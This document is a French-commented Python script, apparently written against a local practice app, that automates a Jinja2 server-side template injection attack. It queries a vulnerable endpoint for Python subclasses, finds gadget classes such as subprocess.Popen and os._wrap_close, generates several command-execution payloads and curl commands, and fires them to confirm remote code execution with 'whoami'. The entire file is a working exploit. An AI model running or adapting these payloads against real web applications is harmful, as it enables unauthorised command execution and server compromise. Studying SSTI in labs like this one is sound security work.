#!/usr/bin/env python3
import requests
import re
from urllib.parse import quote
from html import unescape

TARGET_URL = "http://127.0.0.1:5000/unsafe"
PAYLOAD = "{{ ''.__class__.__mro__[1].__subclasses__() }}"

EXPLOITABLE_CLASSES = [
    'subprocess.Popen',
    'os._wrap_close',
    'warnings.catch_warnings',
    '_frozen_importlib_external.FileLoader',
]


def fetch_subclasses():
    print("[*] Envoi du payload pour récupérer les subclasses...")
    params = {'name': PAYLOAD}
    try:
        response = requests.get(TARGET_URL, params=params, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la requête: {e}")
        return None


def parse_subclasses(html_content):
    print("[*] Parsing du contenu HTML...")
    html_content = unescape(html_content)
    match = re.search(r'Hello,\s*\[(.*?)\]!', html_content, re.DOTALL)
    if not match:
        print("[!] Impossible de trouver la liste des classes")
        return []
    classes_str = match.group(1)
    class_pattern = r"<class\s+'([^']+)'>"
    classes = re.findall(class_pattern, classes_str)
    print(f"[+] {len(classes)} classes trouvées")
    return classes


def find_exploitable_classes(classes):
    print("\n[*] Recherche des classes exploitables...")
    print("=" * 70)
    exploitable = {}
    for idx, class_name in enumerate(classes):
        if class_name in EXPLOITABLE_CLASSES:
            exploitable[class_name] = idx
            print(f"[+] TROUVÉ: {class_name:50} Index: {idx}")
        elif any(target in class_name for target in ['Popen', 'wrap_close', 'FileLoader', 'catch_warnings']):
            exploitable[class_name] = idx
            print(f"[+] TROUVÉ: {class_name:50} Index: {idx}")
    return exploitable


def generate_exploit_payloads(exploitable_classes):
    print("\n" + "=" * 70)
    print("[*] Génération des payloads d'exploitation")
    print("=" * 70)
    if not exploitable_classes:
        print("[!] Aucune classe exploitable trouvée")
        return

    if 'subprocess.Popen' in exploitable_classes:
        idx = exploitable_classes['subprocess.Popen']
        print(f"\n[+] Payloads pour subprocess.Popen (index {idx}):")
        print("\n   MÉTHODE 1 - Utilisation directe avec liste d'arguments:")
        payload_whoami = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}](['whoami'], stdout=-1).communicate()[0].decode() }}}}"
        print(f"\n   • whoami:")
        print(f"     {TARGET_URL}?name={quote(payload_whoami)}")
        print("\n   MÉTHODE 2 - Via __import__ et os.popen:")
        payload_import = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}}}"
        print(f"\n   • whoami via os.popen:")
        print(f"     {TARGET_URL}?name={quote(payload_import)}")
        print("\n   MÉTHODE 3 - Import subprocess via __builtins__:")
        payload_subprocess = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('whoami', shell=True).decode() }}}}"
        print(f"\n   • whoami via subprocess.check_output:")
        print(f"     {TARGET_URL}?name={quote(payload_subprocess)}")
        print("\n   Exemples de commandes curl:")
        print(f"\n   curl \"{TARGET_URL}?name={quote(payload_whoami)}\"")
        print(f"\n   curl \"{TARGET_URL}?name={quote(payload_import)}\"")

    if 'os._wrap_close' in exploitable_classes:
        idx = exploitable_classes['os._wrap_close']
        print(f"\n[+] Payloads pour os._wrap_close (index {idx}):")
        payload_popen = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['popen']('whoami').read() }}}}"
        print(f"\n   • Via popen:")
        print(f"     {TARGET_URL}?name={quote(payload_popen)}")
        payload_system = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['system']('whoami') }}}}"
        print(f"\n   • Via system (affiche le résultat mais retourne le code):")
        print(f"     {TARGET_URL}?name={quote(payload_system)}")

    if 'warnings.catch_warnings' in exploitable_classes:
        idx = exploitable_classes['warnings.catch_warnings']
        print(f"\n[+] Payloads pour warnings.catch_warnings (index {idx}):")
        payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}]()._module.__builtins__['__import__']('os').popen('whoami').read() }}}}"
        print(f"\n   • Via os.popen:")
        print(f"     {TARGET_URL}?name={quote(payload)}")


def test_rce(exploitable_classes):
    print("\n" + "=" * 70)
    print("[*] Test d'exécution de code (RCE)")
    print("=" * 70)

    if 'os._wrap_close' in exploitable_classes:
        idx = exploitable_classes['os._wrap_close']
        print(f"\n[TEST 1] os._wrap_close (index {idx}) - Via popen")
        test_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['popen']('whoami').read() }}}}"
        try:
            response = requests.get(TARGET_URL, params={'name': test_payload}, timeout=10)
            if response.status_code == 200:
                response_text = unescape(response.text)
                match = re.search(r'Hello,\s*(.*?)!', response_text, re.DOTALL)
                if match:
                    result = match.group(1).strip()
                    print(f"[+] Résultat: {result}")
                    print("[+] RCE CONFIRMÉ avec os._wrap_close! ✓")
                    return True
            else:
                print(f"[-] Erreur HTTP {response.status_code}")
        except Exception as e:
            print(f"[-] Erreur: {e}")

    if 'subprocess.Popen' in exploitable_classes:
        idx = exploitable_classes['subprocess.Popen']
        print(f"\n[TEST 2] subprocess.Popen (index {idx}) - Via __import__")
        test_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}}}"
        try:
            response = requests.get(TARGET_URL, params={'name': test_payload}, timeout=10)
            if response.status_code == 200:
                response_text = unescape(response.text)
                match = re.search(r'Hello,\s*(.*?)!', response_text, re.DOTALL)
                if match:
                    result = match.group(1).strip()
                    print(f"[+] Résultat: {result}")
                    print("[+] RCE CONFIRMÉ avec subprocess.Popen! ✓")
                    return True
            else:
                print(f"[-] Erreur HTTP {response.status_code}")
        except Exception as e:
            print(f"[-] Erreur: {e}")

    if 'warnings.catch_warnings' in exploitable_classes:
        idx = exploitable_classes['warnings.catch_warnings']
        print(f"\n[TEST 3] warnings.catch_warnings (index {idx})")
        test_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{idx}]()._module.__builtins__['__import__']('os').popen('whoami').read() }}}}"
        try:
            response = requests.get(TARGET_URL, params={'name': test_payload}, timeout=10)
            if response.status_code == 200:
                response_text = unescape(response.text)
                match = re.search(r'Hello,\s*(.*?)!', response_text, re.DOTALL)
                if match:
                    result = match.group(1).strip()
                    print(f"[+] Résultat: {result}")
                    print("[+] RCE CONFIRMÉ avec warnings.catch_warnings! ✓")
                    return True
            else:
                print(f"[-] Erreur HTTP {response.status_code}")
        except Exception as e:
            print(f"[-] Erreur: {e}")

    print("\n[!] Aucun test RCE réussi")
    return False


def main():
    print("=" * 70)
    print(" SSTI Exploitable Class Finder")
    print(" Recherche de classes exploitables pour Jinja2 SSTI")
    print("=" * 70)

    html_content = fetch_subclasses()
    if not html_content:
        return

    classes = parse_subclasses(html_content)
    if not classes:
        return

    exploitable = find_exploitable_classes(classes)
    generate_exploit_payloads(exploitable)
    test_rce(exploitable)

    print("\n" + "=" * 70)
    print("[*] Analyse terminée")
    print("=" * 70)


if __name__ == "__main__":
    main()